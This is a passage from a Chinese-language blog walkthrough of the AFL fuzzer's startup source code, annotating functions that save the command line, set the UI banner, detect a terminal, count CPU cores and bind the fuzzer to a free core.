class="line">    FATAL(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AFL_LD_PRELOAD：已废弃的旧变量名</span></span><br><span class="line"><span class="comment"> * - 提醒用户使用新的 AFL_PRELOAD</span></span><br><span class="line"><span class="comment"> * - 保持向后兼容性的同时引导升级</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h2><p>接下来是<code>save_cmdline(argc, argv);</code>来把我们输入的命令保存在内存中的全局变量 <code>orig_cmdline</code>，以便后续使用。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_cmdline</span><span class="params">(u32 argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  u32 len = <span class="number">1</span>, i;  <span class="comment">// len初始化为1（为末尾的&#x27;\0&#x27;预留空间）</span></span><br><span class="line">  u8 *buf;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 步骤1: 计算所需内存大小 ========== */</span></span><br><span class="line">  <span class="comment">// 遍历所有命令行参数，累加每个参数的长度</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    len += <span class="built_in">strlen</span>(argv[i]) + <span class="number">1</span>;  <span class="comment">// +1 为参数间的空格分隔符</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 步骤2: 分配内存并保存到全局变量 ========== */</span></span><br><span class="line">  <span class="comment">// ck_alloc 是 AFL 的安全内存分配函数（会检查分配失败）</span></span><br><span class="line">  <span class="comment">// orig_cmdline 是全局变量，保存原始命令行供后续使用</span></span><br><span class="line">  buf = orig_cmdline = <span class="built_in">ck_alloc</span>(len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 步骤3: 构建完整的命令行字符串 ========== */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    u32 l = <span class="built_in">strlen</span>(argv[i]);  <span class="comment">// 当前参数的长度</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将当前参数复制到缓冲区当前位置</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[i], l);</span><br><span class="line">    buf += l;  <span class="comment">// 移动缓冲区指针到已复制内容的末尾</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在参数之间添加空格（最后一个参数后面不加）</span></span><br><span class="line">    <span class="keyword">if</span> (i != argc - <span class="number">1</span>)</span><br><span class="line">      *(buf++) = <span class="string">&#x27; &#x27;</span>;  <span class="comment">// 写入空格并移动指针</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 步骤4: 添加字符串结束符 ========== */</span></span><br><span class="line">  *buf = <span class="number">0</span>;  <span class="comment">// 等同于 &#x27;\0&#x27;，标记字符串结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h2><p>接下来是fix_up_banner(argv[optind]);，首先我了看到这里有个optind参数，这个参数是处理到的下一个参数，是getopt的默认参数，当遇到 – 的时候会返回0，配合签名档代码也是就说这里的optind指向的是我们的目标程序</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fix_up_banner</span><span class="params">(u8 *name)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* ========== 1. 检查是否已设置 banner ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (!use_banner) <span class="comment">// 如果还没有设置过 banner</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* ========== 2. 根据运行模式选择 banner ========== */</span></span><br><span class="line">    <span class="keyword">if</span> (sync_id) <span class="comment">// 并行模式：使用同步ID作为标识</span></span><br><span class="line">    &#123;</span><br><span class="line">      use_banner = sync_id; <span class="comment">// 例如：&quot;master&quot;, &quot;slave1&quot;, &quot;fuzzer2&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span>                  <span class="comment">// 单机模式：从目标程序路径提取文件名</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 查找最后一个路径分隔符 &#x27;/&#x27;</span></span><br><span class="line">      u8 *trim = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)name, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!trim)           <span class="comment">// 没有路径分隔符，说明就是文件名</span></span><br><span class="line">        use_banner = name; <span class="comment">// 直接使用整个name</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        use_banner = trim + <span class="number">1</span>; <span class="comment">// 跳过 &#x27;/&#x27;，使用文件名部分</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 3. 长度限制和截断处理 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(use_banner) &gt; <span class="number">40</span>) <span class="comment">// 如果banner太长（影响界面显示）</span></span><br><span class="line">  &#123;</span><br><span class="line">    u8 *tmp = <span class="built_in">ck_alloc</span>(<span class="number">44</span>);               <span class="comment">// 分配新内存：40字符 + &quot;...&quot; + &#x27;\0&#x27;</span></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%.40s...&quot;</span>, use_banner); <span class="comment">// 截取前40字符并添加&quot;...&quot;</span></span><br><span class="line">    use_banner = tmp;                     <span class="comment">// 使用截断后的版本</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现出来的效果如图所示<br><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250908160109671.png"></p><h2 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h2><p>就是检查是否禁用UI，且通过ioctl检查是否在终端</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check if we&#x27;re on TTY. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_if_tty</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">ws</span>;</span>  <span class="comment">// 用于存储终端窗口大小信息的结构体</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 1. 检查是否强制禁用 UI ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_UI&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;Disabling the UI because AFL_NO_UI is set.&quot;</span>);</span><br><span class="line">    not_on_tty = <span class="number">1</span>;  <span class="comment">// 设置全局标志，表示不在终端运行</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 2. 通过 ioctl 检测是否在终端 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ioctl</span>(<span class="number">1</span>, TIOCGWINSZ, &amp;ws)) &#123;  <span class="comment">// 尝试获取终端窗口大小</span></span><br><span class="line">    <span class="comment">// ioctl 失败（返回 -1）</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (errno == ENOTTY) &#123;  <span class="comment">// ENOTTY = &quot;Not a typewriter&quot;（不是终端）</span></span><br><span class="line">      <span class="built_in">OKF</span>(<span class="string">&quot;Looks like we&#x27;re not running on a tty, so I&#x27;ll be a bit less &quot;</span></span><br><span class="line">          <span class="string">&quot;verbose.&quot;</span>);</span><br><span class="line">      not_on_tty = <span class="number">1</span>;  <span class="comment">// 标记为非终端模式</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他错误忽略，保持默认（假设是终端）</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ioctl 成功：说明是在终端运行，not_on_tty 保持为 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h2><p>这个函数的核心功能就是获取cpu信息以及线程信息</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">get_core_count</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u32 cur_runnable = <span class="number">0</span>;  <span class="comment">// 当前可运行的进程数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 1. macOS/BSD 系统的 CPU 核心检测 ========== */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__)</span></span><br><span class="line">  <span class="keyword">size_t</span> s = <span class="built_in"><span class="keyword">sizeof</span></span>(cpu_core_count);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* macOS 特定方法：使用 sysctlbyname */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sysctlbyname</span>(<span class="string">&quot;hw.logicalcpu&quot;</span>, &amp;cpu_core_count, &amp;s, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;  <span class="comment">// 获取逻辑 CPU 数（包括超线程）</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="comment">/* FreeBSD/OpenBSD：使用传统 sysctl */</span></span><br><span class="line">  <span class="keyword">int</span> s_name[<span class="number">2</span>] = &#123;CTL_HW, HW_NCPU&#125;;  <span class="comment">// 硬件类别，CPU 数量</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sysctl</span>(s_name, <span class="number">2</span>, &amp;cpu_core_count, &amp;s, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* Linux 系统 */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 2. Linux 系统的 CPU 核心检测 ========== */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="comment">/* 方法1：如果支持 CPU 亲和性，使用 sysconf */</span></span><br><span class="line">  cpu_core_count = <span class="built_in">sysconf</span>(_SC_NPROCESSORS_ONLN);  <span class="comment">// 在线处理器数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="comment">/* 方法2：解析 /proc/stat 文件 */</span></span><br><span class="line">  FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/stat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  u8 tmp[<span class="number">1024</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!f)</span><br><span class="line">    <span class="keyword">return</span>;  <span class="comment">// 无法打开文件，放弃</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 计算 CPU 核心数：统计 &quot;cpu0&quot;, &quot;cpu1&quot; 等行 */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), f))</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(tmp, <span class="string">&quot;cpu&quot;</span>, <span class="number">3</span>) &amp;&amp; <span class="built_in">isdigit</span>(tmp[<span class="number">3</span>]))  <span class="comment">// cpu[数字]</span></span><br><span class="line">      cpu_core_count++;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fclose</span>(f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^HAVE_AFFINITY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^(__APPLE__ || __FreeBSD__ || __OpenBSD__) */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 3. 系统负载评估 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (cpu_core_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* 获取当前可运行的进程数 */</span></span><br><span class="line">    cur_runnable = (u32)<span class="built_in">get_runnable_processes</span>();</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__)</span></span><br><span class="line">    <span class="comment">/* BSD 系统的 1 分钟平均负载不包括当前进程，手动加 1 */</span></span><br><span class="line">    cur_runnable++;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 输出 CPU 核心数和系统利用率 */</span></span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;You have %u CPU core%s and %u runnable tasks (utilization: %0.0f%%).&quot;</span>,</span><br><span class="line">        cpu_core_count, </span><br><span class="line">        cpu_core_count &gt; <span class="number">1</span> ? <span class="string">&quot;s&quot;</span> : <span class="string">&quot;&quot;</span>,  <span class="comment">// 复数处理</span></span><br><span class="line">        cur_runnable,</span><br><span class="line">        cur_runnable * <span class="number">100.0</span> / cpu_core_count);  <span class="comment">// 利用率百分比</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ========== 4. 性能建议 ========== */</span></span><br><span class="line">    <span class="keyword">if</span> (cpu_core_count &gt; <span class="number">1</span>) &#123;  <span class="comment">// 多核系统</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (cur_runnable &gt; cpu_core_count * <span class="number">1.5</span>) &#123;</span><br><span class="line">        <span class="comment">/* 系统负载过高（运行进程数 &gt; 核心数的 1.5 倍）*/</span></span><br><span class="line">        <span class="built_in">WARNF</span>(<span class="string">&quot;System under apparent load, performance may be spotty.&quot;</span>);</span><br><span class="line">        </span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_runnable + <span class="number">1</span> &lt;= cpu_core_count) &#123;</span><br><span class="line">        <span class="comment">/* 系统还有空闲核心，建议并行 fuzzing */</span></span><br><span class="line">        <span class="built_in">OKF</span>(<span class="string">&quot;Try parallel jobs - see %s/parallel_fuzzing.txt.&quot;</span>, doc_path);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 无法获取 CPU 核心数 */</span></span><br><span class="line">    cpu_core_count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;Unable to figure out the number of CPU cores.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们关注的重点还是放在linux上，这里是通过<strong>sysconf</strong>获取了cpu数量<br>接着是从/proc/stat读入内存，/proc/stat的内容如下：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250908194956442.png"></p><p>cpu部分格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cpu[n] user nice system idle iowait irq softirq steal guest guest_nice</span><br></pre></td></tr></table></figure><p>这里主要是通过这个文件<strong>计算cpu数量</strong>，可以看到是16个接下来是一个函数</p><h3 id="get-runnable-processes"><a href="#get-runnable-processes" class="headerlink" title="get_runnable_processes"></a>get_runnable_processes</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">get_runnable_processes</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">double</span> res;  <span class="comment">// 静态变量，保存平滑后的结果（用于 Linux）</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__)</span></span><br><span class="line">  <span class="comment">/* ========== BSD/macOS 系统：使用负载平均值 ========== */</span></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">   * BSD 系统没有直接获取可运行进程数的接口</span></span><br><span class="line"><span class="comment">   * 使用 1 分钟负载平均值作为近似值</span></span><br><span class="line"><span class="comment">   * 注意：这不是精确值，短生命周期进程可能未被计入</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getloadavg</span>(&amp;res, <span class="number">1</span>) != <span class="number">1</span>)  <span class="comment">// 获取 1 分钟平均负载</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 失败返回 0</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* Linux 系统 */</span></span></span><br><span class="line">  <span class="comment">/* ========== Linux：解析 /proc/stat ========== */</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Linux 上 /proc/stat 提供更准确的实时数据</span></span><br><span class="line"><span class="comment">   * 负载平均值计算方式特殊，可能不能很好反映短生命周期进程</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/stat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  u8 tmp[<span class="number">1024</span>];</span><br><span class="line">  u32 val = <span class="number">0</span>;  <span class="comment">// 当前可运行进程总数</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!f)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 无法打开文件</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 逐行读取 /proc/stat */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(tmp, <span class="built_in"><span class="keyword">sizeof</span></span>(tmp), f)) &#123;</span><br><span class="line">    <span class="comment">/* 统计两类进程：</span></span><br><span class="line"><span class="comment">     * 1. procs_running：正在运行或等待运行的进程</span></span><br><span class="line"><span class="comment">     * 2. procs_blocked：因 I/O 阻塞的进程</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(tmp, <span class="string">&quot;procs_running &quot;</span>, <span class="number">14</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(tmp, <span class="string">&quot;procs_blocked &quot;</span>, <span class="number">14</span>))</span><br><span class="line">      val += <span class="built_in">atoi</span>(tmp + <span class="number">14</span>);  <span class="comment">// 解析数字并累加</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fclose</span>(f);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* ========== 指数移动平均（EMA）平滑 ========== */</span></span><br><span class="line">  <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">    <span class="comment">/* 第一次调用，直接使用当前值 */</span></span><br><span class="line">    res = val;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 后续调用，使用指数移动平均平滑 */</span></span><br><span class="line">    res = res * (<span class="number">1.0</span> - <span class="number">1.0</span> / AVG_SMOOTHING) +    <span class="comment">// 历史权重</span></span><br><span class="line">          ((<span class="keyword">double</span>)val) * (<span class="number">1.0</span> / AVG_SMOOTHING);  <span class="comment">// 新值权重</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^(__APPLE__ || __FreeBSD__ || __OpenBSD__) */</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最重要的就是下面两个值，还是和上面一样是从sysconf获取的<br><strong>procs_running</strong>（运行进程数）以及 <strong>procs_blocked</strong>（阻塞进程数）</p><p>val会获取到二者的加值，这里是第一次res会直接选择为val但是后面如果再次调用 res = res * (1.0 - 1.0 / AVG_SMOOTHING) +  ((double)val) * (1.0 / AVG_SMOOTHING);，这里AVG_SMOOTHING为16。</p><p>这个函数结束后就是对信息的输出，以及性能建议。效果如下：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250908222131414.png"></p><p>接下来是一个宏判断，这里的HAVE_AFFINITY在<strong>get_core_count</strong>中出现过</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br></pre></td></tr></table></figure><p>我们看看bind_to_free_cpu()这个代码</p><h2 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h2><p>这个函数主要是从/proc目录中查看所有的线程，查找是否有空闲的cpu，并且如果有指定了要绑定的 CPU 核心，就检查是否空闲，就选择这个cpu，如果没有指定就按顺序选择，最后再通过 <code>CPU_ZERO(&amp;c);</code>h和<code>CPU_SET(i, &amp;c);</code>两个函数设置，二者是 Linux 系统提供的 <strong>CPU 亲和性（CPU Affinity）API</strong>，用于操作 CPU 集合。我在代码注释后解释一下。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bind_to_free_cpu</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  DIR *d;                           <span class="comment">// 目录流指针，用于遍历 /proc 目录</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">de</span>;</span>                <span class="comment">// 目录项结构体，存储读取到的目录项信息</span></span><br><span class="line">  <span class="keyword">cpu_set_t</span> c;                      <span class="comment">// CPU 集合，用于设置 CPU 亲和性</span></span><br><span class="line">  u8 cpu_used[<span class="number">4096</span>] = &#123;<span class="number">0</span>&#125;;         <span class="comment">// 标记哪些 CPU 核心已被占用，最多支持 4096 个核心</span></span><br><span class="line">  u32 i;                            <span class="comment">// 循环计数器</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果系统只有单核 CPU，无需绑定，直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (cpu_core_count &lt; <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查环境变量 AFL_NO_AFFINITY，如果设置了则不进行 CPU 绑定 */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_AFFINITY&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;Not binding to a CPU core (AFL_NO_AFFINITY set).&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开 /proc 目录，Linux 系统的进程信息都在这里 */</span></span><br><span class="line">  d = <span class="built_in">opendir</span>(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!d) &#123;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;Unable to access /proc - can&#x27;t scan for free CPU cores.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Checking CPU core loadout...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 引入随机延迟（0-250毫秒），避免多个 AFL 实例同时启动时选择同一个 CPU 核心 */</span></span><br><span class="line">  <span class="built_in">usleep</span>(<span class="built_in">R</span>(<span class="number">1000</span>) * <span class="number">250</span>);  <span class="comment">// R(1000) 生成 0-999 的随机数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 遍历 /proc 下的所有进程目录，检查每个进程的 CPU 绑定情况 */</span></span><br><span class="line">  <span class="keyword">while</span> ((de = <span class="built_in">readdir</span>(d))) &#123;</span><br><span class="line">    u8 *fn;                         <span class="comment">// 存储 /proc/&lt;pid&gt;/status 文件路径</span></span><br><span class="line">    FILE *f;                        <span class="comment">// 文件指针</span></span><br><span class="line">    u8 tmp[MAX_LINE];              <span class="comment">// 临时缓冲区，存储读取的每一行</span></span><br><span class="line">    u8 has_vmsize = <span class="number">0</span>;             <span class="comment">// 标记进程是否有 VmSize（用于区分用户进程和内核线程）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 跳过非数字开头的目录项（只处理进程 ID 目录） */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(de-&gt;d_name[<span class="number">0</span>]))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 构造 /proc/&lt;pid&gt;/status 文件路径 */</span></span><br><span class="line">    fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;/proc/%s/status&quot;</span>, de-&gt;d_name);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 打开 status 文件，如果失败则跳过这个进程 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(f = <span class="built_in">fopen</span>(fn, <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 逐行读取 status 文件内容 */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fgets</span>(tmp, MAX_LINE, f)) &#123;</span><br><span class="line">      u32 hval;  <span class="comment">// 存储解析出的 CPU 核心编号</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 检查是否有 VmSize 字段（内核线程没有这个字段） */</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(tmp, <span class="string">&quot;VmSize:\t&quot;</span>, <span class="number">8</span>))</span><br><span class="line">        has_vmsize = <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/*查找 Cpus_allowed_list 字段，这个字段显示进程允许运行的 CPU 核心 */</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(tmp, <span class="string">&quot;Cpus_allowed_list:\t&quot;</span>, <span class="number">19</span>) &amp;&amp;  <span class="comment">// 找到 Cpus_allowed_list 行</span></span><br><span class="line">          !<span class="built_in">strchr</span>((<span class="keyword">char</span> *)tmp, <span class="string">&#x27;-&#x27;</span>) &amp;&amp;                  <span class="comment">// 不包含范围符号 &#x27;-&#x27;（如 0-3）</span></span><br><span class="line">          !<span class="built_in">strchr</span>((<span class="keyword">char</span> *)tmp, <span class="string">&#x27;,&#x27;</span>) &amp;&amp;                  <span class="comment">// 不包含列表符号 &#x27;,&#x27;（如 0,2,4）</span></span><br><span class="line">          <span class="built_in">sscanf</span>(tmp + <span class="number">19</span>, <span class="string">&quot;%u&quot;</span>, &amp;hval) == <span class="number">1</span> &amp;&amp;        <span class="comment">// 成功解析出单个数字</span></span><br><span class="line">          hval &lt; <span class="built_in"><span class="keyword">sizeof</span></span>(cpu_used) &amp;&amp;                    <span class="comment">// CPU 编号在有效范围内</span></span><br><span class="line">          has_vmsize) &#123;                                 <span class="comment">// 是用户进程（有 VmSize）</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 标记这个 CPU 核心已被占用 */</span></span><br><span class="line">        cpu_used[hval] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ck_free</span>(fn);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">closedir</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果用户指定了要绑定的 CPU 核心 */</span></span><br><span class="line">  <span class="keyword">if</span> (cpu_to_bind_given) &#123;</span><br><span class="line">    <span class="comment">/* 检查指定的核心编号是否有效 */</span></span><br><span class="line">    <span class="keyword">if</span> (cpu_to_bind &gt;= cpu_core_count)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;The CPU core id to bind should be between 0 and %u&quot;</span>,</span><br><span class="line">            cpu_core_count - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查指定的核心是否空闲 */</span></span><br><span class="line">    <span class="keyword">if</span> (cpu_used[cpu_to_bind])</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;The CPU core #%u to bind is not free!&quot;</span>, cpu_to_bind);</span><br><span class="line">    </span><br><span class="line">    i = cpu_to_bind;</span><br><span class="line">  &#125; <span class="keyword">else</span> 